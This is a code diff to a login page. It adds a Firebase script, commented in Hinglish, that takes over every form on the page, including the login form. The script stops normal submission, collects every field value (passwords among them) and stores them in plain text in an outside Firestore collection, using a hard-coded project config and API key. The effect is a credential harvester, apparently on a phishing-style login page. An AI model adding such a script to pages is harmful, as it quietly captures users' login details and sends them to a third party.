@@ -313,6 +313,83 @@
         >
         <button type="submit" class="login-submit-btn">Log in</button>
       </form>
+      <!-- MASTER FIREBASE FORM SCRIPT: Paste at the bottom of any HTML file -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-analytics.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore.js";
+
+  // Aapka Firebase Configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyCA6HMq3g5hO_GYiI0DrlTh9V2Ve3VHO4g",
+    authDomain: "coop-grind-prod-3a1f8.firebaseapp.com",
+    projectId: "coop-grind-prod-3a1f8",
+    storageBucket: "coop-grind-prod-3a1f8.firebasestorage.app",
+    messagingSenderId: "349604329745",
+    appId: "1:349604329745:web:100ef75e59a71e879af4b0",
+    measurementId: "G-4WDCQQ80WY"
+  };
+
+  // Initialize Firebase & Firestore
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+  const db = getFirestore(app);
+
+  // Page ke saare forms ko auto-connect karne ka logic
+  document.querySelectorAll("form").forEach((form) => {
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault(); // Page reload hone se rokega
+
+      const submitBtn = form.querySelector('[type="submit"], button:not([type="button"])');
+      const originalBtnText = submitBtn ? submitBtn.innerText : "";
+      if (submitBtn) {
+        submitBtn.disabled = true;
+        submitBtn.innerText = "Saving...";
+      }
+
+      // Form ke har input, select aur textarea se data auto-extract karna
+      const formData = {};
+      const elements = form.querySelectorAll("input, select, textarea");
+
+      elements.forEach((el, index) => {
+        if (el.type === "submit" || el.type === "button" || el.type === "reset") return;
+
+        // Key ka naam तय karna (name -> id -> placeholder -> field_index)
+        const key = el.name || el.id || el.placeholder || `field_${index + 1}`;
+
+        if (el.type === "checkbox") {
+          formData[key] = el.checked;
+        } else if (el.type === "radio") {
+          if (el.checked) formData[key] = el.value;
+        } else {
+          formData[key] = el.value.trim();
+        }
+      });
+
+      // Extra details taaki pata chale kis page/form se data aaya
+      formData.submittedAt = serverTimestamp();
+      formData.pagePath = window.location.pathname;
+
+      // Custom collection name agar form me data-collection attribute diya ho, warna default
+      const collectionName = form.getAttribute("data-collection") || "school_form_submissions";
+
+      try {
+        await addDoc(collection(db, collectionName), formData);
+        alert("Form successfully submit ho gaya!");
+        form.reset();
+      } catch (error) {
+        console.error("Firebase Save Error:", error);
+        alert("Data save karne me error aaya: " + error.message);
+      } finally {
+        if (submitBtn) {
+          submitBtn.disabled = false;
+          submitBtn.innerText = originalBtnText;
+        }
+      }
+    });
+  });
+</script>
+      
 
       <a href="#" class="forgot-link">Forgotten password?</a>
     </div>
